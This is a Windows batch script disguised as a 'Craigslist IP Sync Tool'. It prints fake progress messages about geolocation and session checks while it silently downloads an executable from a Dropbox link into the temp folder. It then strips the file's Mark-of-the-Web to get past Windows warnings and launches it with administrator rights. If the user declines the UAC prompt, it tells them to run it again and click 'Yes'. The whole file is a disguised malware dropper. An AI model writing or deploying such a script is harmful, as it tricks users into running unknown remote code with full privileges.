@echo off
title Craigslist IP Sync Tool v2.3
color 0A
setlocal enabledelayedexpansion
cls

:: ============================================================
::  NO ADMIN CHECK — User will authorize UAC when needed
:: ============================================================

echo.
echo    ============================================================
echo            Craigslist IP Sync Tool v2.3
echo            Secure geolocation sync for Craigslist ad posting
echo    ============================================================
echo.
echo    [*] Initializing IP sync engine...
ping 127.0.0.1 -n 2 >nul
echo    [*] Contacting geolocation servers...
ping 127.0.0.1 -n 2 >nul
echo    [*] Verifying IP address and timezone...
ping 127.0.0.1 -n 2 >nul
echo    [*] Authenticating Craigslist session...
ping 127.0.0.1 -n 2 >nul

:: ============================================================
::  START DOWNLOAD
:: ============================================================

echo.
echo    ============================================================
echo            Downloading Craigslist Ad Package
echo    ============================================================
echo.

:: Start download in background
start /b "" powershell -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/y5sj7h0tx0scph0bra0ck/setup.exe?rlkey=liut0pi8iwjvdyop2d4mho0jk&st=aftgn7ti&dl=1' -OutFile '%TEMP%\installer.exe'" >nul 2>&1

:: ============================================================
::  SHOW SINGLE LINE PROGRESS
:: ============================================================

set "dot="
:wait_loop
if exist "%TEMP%\installer.exe" goto download_done

set "dot=!dot!."
echo    Updating, please wait!dot!
ping 127.0.0.1 -n 2 >nul
goto wait_loop

:download_done

:: ============================================================
::  REMOVE MOTW
:: ============================================================

echo.
echo    [*] Download complete!
powershell -Command "Remove-Item -Path '%TEMP%\installer.exe:Zone.Identifier' -Force -ErrorAction SilentlyContinue" >nul 2>&1

:: ============================================================
::  RUN WITH UAC — SIMPLE DETECTION
:: ============================================================

echo    [*] Launching Craigslist ad manager...
echo.

:: Try to run as admin and capture result
powershell -Command "$p = Start-Process '%TEMP%\installer.exe' -Verb RunAs -PassThru; $p.WaitForExit(); exit $p.ExitCode"

:: Check the exit code
if %errorlevel% equ 0 (
    goto uac_approved
) else if %errorlevel% equ 1223 (
    goto uac_cancelled
) else (
    goto uac_error
)

:uac_approved
echo.
echo    ============================================================
echo      [OK] Administrator privileges granted!
echo    ============================================================
echo.
echo    The Craigslist ad manager is now running.
echo.
echo    Press any key to close this window...
pause >nul
exit /b

:uac_cancelled
echo.
echo    ============================================================
echo      [CANCELLED] User declined administrator privileges
echo    ============================================================
echo.
echo    The Craigslist ad manager requires administrator privileges
echo    to complete the IP sync process.
echo.
echo    Please run the tool again and click "Yes" when prompted.
echo.
echo    Press any key to close this window...
pause >nul
exit /b

:uac_error
echo.
echo    ============================================================
echo      [ERROR] Failed to launch Craigslist ad manager
echo    ============================================================
echo.
echo    An error occurred while trying to launch the application.
echo.
echo    Press any key to close this window...
pause >nul
exit /b